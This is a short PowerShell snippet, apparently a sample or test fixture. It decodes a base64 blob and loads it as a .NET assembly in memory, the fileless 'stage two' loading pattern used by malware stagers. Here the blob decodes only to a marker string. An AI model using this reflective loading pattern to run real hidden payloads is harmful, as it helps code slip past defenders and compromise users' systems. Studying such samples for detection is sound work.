$AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpoZ3N2b3FtY3V5')
Write-Verbose ("Assembly bytes: " + $AssemblyBytes.Length)
[Reflection.Assembly]::Load($AssemblyBytes)
$ProgressPreference = "SilentlyContinue"
